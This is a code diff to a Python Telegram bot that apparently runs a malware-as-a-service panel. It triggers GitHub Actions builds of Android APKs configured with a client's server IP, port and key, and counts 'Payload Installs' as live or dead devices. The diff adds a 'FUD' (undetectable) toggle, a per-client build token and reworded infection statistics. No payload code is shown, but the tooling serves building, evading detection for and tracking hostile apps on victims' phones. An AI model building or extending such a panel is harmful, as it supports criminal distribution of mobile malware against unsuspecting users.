@@ -236,6 +236,13 @@ def init_db():
             log.info(f"Migration: added builds.{col}")
         except Exception:
             pass  # column already exists
+    # ── Migration: clients table ──────────────────────────────────────────────
+    try:
+        db.execute("ALTER TABLE clients ADD COLUMN vpn_bypass INTEGER NOT NULL DEFAULT 1")
+        db.commit()
+        log.info("Migration: added clients.vpn_bypass")
+    except Exception:
+        pass  # column already exists
     db.close()
     log.info("Database initialized")
 
@@ -923,7 +930,7 @@ def kb_clients(clients: list) -> types.InlineKeyboardMarkup:
     return kb
 
 
-def kb_client_detail(client_id: int, active: bool = True) -> types.InlineKeyboardMarkup:
+def kb_client_detail(client_id: int, active: bool = True, vpn_bypass: int = 1) -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=1)
     # Primary actions
     kb.add(types.InlineKeyboardButton(
@@ -942,6 +949,13 @@ def kb_client_detail(client_id: int, active: bool = True) -> types.InlineKeyboar
     else:
         kb.add(types.InlineKeyboardButton(
             "🟢 Activate",     callback_data=f"toggle_client_{client_id}"))
+    # FUD toggle
+    if vpn_bypass:
+        kb.add(types.InlineKeyboardButton(
+            "🔴 FUD: ON  → Turn OFF", callback_data=f"toggle_fud_{client_id}"))
+    else:
+        kb.add(types.InlineKeyboardButton(
+            "🟢 FUD: OFF → Turn ON",  callback_data=f"toggle_fud_{client_id}"))
     # Navigation
     kb.add(
         types.InlineKeyboardButton(
@@ -1365,6 +1379,7 @@ def text_client_detail(c: dict) -> str:
         st       = "✅" if last_build["status"] == "success" else "❌"
         last     = f"#{last_build['build_number']} {st} {emoji}"
 
+    fud_label = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
     return (
         f"👤 <b>{name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
@@ -1372,6 +1387,7 @@ def text_client_detail(c: dict) -> str:
         f"Telegram ID : <code>{c['telegram_id']}</code>\n"
         f"RDP IP      : <code>{c['rdp_ip']}</code>\n"
         f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
+        f"FUD         : {fud_label}\n"
         f"Builds      : {builds}\n"
         f"Devices     : {devices}\n"
         f"Last Build  : {last}\n"
@@ -1702,16 +1718,21 @@ def text_client_stats(c: dict) -> str:
                                      ("⚙️", top["template"]))
         top_template = f"{emoji} {name}"
 
+    dead_devices = total_devices - active_24h
     name = c["profile_name"] or c["telegram_username"]
     return (
         f"📊 <b>Stats — {name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"Total Builds  : {total_builds}\n"
-        f"Successful    : {success_builds}\n"
-        f"Failed        : {total_builds - success_builds}\n"
-        f"Total Devices : {total_devices}\n"
-        f"Active (24h)  : {active_24h}\n"
-        f"Top Template  : {top_template}\n"
+        f"Total Builds      : {total_builds}\n"
+        f"Successful        : {success_builds}\n"
+        f"Failed            : {total_builds - success_builds}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Payload Installs\n"
+        f"Total Installs    : {total_devices}\n"
+        f"Live  (last 24h)  : {active_24h} 🟢\n"
+        f"Dead              : {dead_devices} 🔴\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"Top Template      : {top_template}\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
 
@@ -1952,7 +1973,8 @@ def show_client_detail(chat_id, message_id, client_id):
         return
     safe_edit(chat_id, message_id,
               text_client_detail(dict(c)),
-              kb_client_detail(client_id, active=bool(c["active"])))
+              kb_client_detail(client_id, active=bool(c["active"]),
+                               vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1)))
 
 
 def show_builds_history(chat_id, message_id, client_id):
@@ -2044,7 +2066,8 @@ def trigger_github_build(template: str, client_id: int,
                          server_port_b64: str = "",
                          server_key_b64: str = "",
                          client_name: str = "",
-                         client_ip: str = "") -> bool:
+                         client_ip: str = "",
+                         client_token: str = "manual") -> bool:
     url     = (
         f"https://api.github.com/repos/"
         f"{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
@@ -2062,6 +2085,7 @@ def trigger_github_build(template: str, client_id: int,
         "build_message_id": str(message_id),
         "client_name":      client_name,
         "client_ip":        client_ip,
+        "client_token":     client_token or "manual",
     }
     if custom_app_name:
         inputs["custom_app_name"] = custom_app_name
@@ -3390,7 +3414,35 @@ def handle_callback(call):
                   f"✅ <b>{status_word}</b>\n"
                   f"━━━━━━━━━━━━━━━━━━━━\n"
                   + text_client_detail(dict(c)),
-                  kb_client_detail(client_id, active=bool(new_active)))
+                  kb_client_detail(client_id, active=bool(new_active),
+                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1)))
+
+    elif data.startswith("toggle_fud_"):
+        client_id = int(data.split("_")[2])
+        db        = get_db()
+        c         = db.execute(
+            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        if not c:
+            db.close()
+            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
+            return
+        new_bypass = 0 if c["vpn_bypass"] else 1
+        db.execute("UPDATE clients SET vpn_bypass=? WHERE id=?",
+                   (new_bypass, client_id))
+        db.commit()
+        db.close()
+        # Reload fresh data
+        db = get_db()
+        c  = db.execute(
+            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        db.close()
+        fud_word = "ON 🟢" if new_bypass else "OFF 🔴"
+        safe_edit(chat_id, msg_id,
+                  f"✅ <b>FUD {fud_word}</b>\n"
+                  f"━━━━━━━━━━━━━━━━━━━━\n"
+                  + text_client_detail(dict(c)),
+                  kb_client_detail(client_id, active=bool(c["active"]),
+                                   vpn_bypass=new_bypass))
 
     elif data.startswith("delete_client_"):
         client_id = int(data.split("_")[2])
@@ -3593,7 +3645,7 @@ def handle_callback(call):
         # Load stored config
         _db = get_db()
         _c  = _db.execute(
-            "SELECT profile_name, telegram_username, rdp_ip FROM clients WHERE id=?",
+            "SELECT profile_name, telegram_username, rdp_ip, token FROM clients WHERE id=?",
             (client_id,)).fetchone()
         _lb = _db.execute(
             "SELECT server_ip, server_port, server_key FROM builds "
@@ -3601,8 +3653,9 @@ def handle_callback(call):
             "ORDER BY id DESC LIMIT 1",
             (client_id, template)).fetchone()
         _db.close()
-        _client_name = (_c["profile_name"] or _c["telegram_username"]) if _c else ""
-        _client_ip   = _c["rdp_ip"] if _c else ""
+        _client_name  = (_c["profile_name"] or _c["telegram_username"]) if _c else ""
+        _client_ip    = _c["rdp_ip"] if _c else ""
+        _client_token = _c["token"] if _c else "manual"
         _ip   = (_lb["server_ip"]   if _lb and _lb["server_ip"]   else _client_ip)
         _port = (_lb["server_port"] if _lb and _lb["server_port"] else "")
         _key  = (_lb["server_key"]  if _lb and _lb["server_key"]  else "")
@@ -3631,6 +3684,7 @@ def handle_callback(call):
             server_key_b64=srv_key_b64,
             client_name=_client_name,
             client_ip=_client_ip,
+            client_token=_client_token,
         )
         if ok:
             _db2 = get_db()
@@ -3747,15 +3801,16 @@ def handle_callback(call):
             "━━━━━━━━━━━━━━━━━━━━\n"
             "⏱ Starting..."
         )
-        # Lookup client name + IP for APK filename
+        # Lookup client name + IP + token for APK filename and BuildConfig
         _db = get_db()
         _cl = _db.execute(
-            "SELECT profile_name, telegram_username, rdp_ip FROM clients WHERE id=?",
+            "SELECT profile_name, telegram_username, rdp_ip, token FROM clients WHERE id=?",
             (client_id,)
         ).fetchone()
         _db.close()
-        _client_name = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
-        _client_ip   = _cl["rdp_ip"] if _cl else ""
+        _client_name  = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
+        _client_ip    = _cl["rdp_ip"] if _cl else ""
+        _client_token = _cl["token"] if _cl else "manual"
 
         ok = trigger_github_build(
             template=template,
@@ -3769,6 +3824,7 @@ def handle_callback(call):
             server_key_b64=srv_key_b64,
             client_name=_client_name,
             client_ip=_client_ip,
+            client_token=_client_token,
         )
         if ok:
             db = get_db()
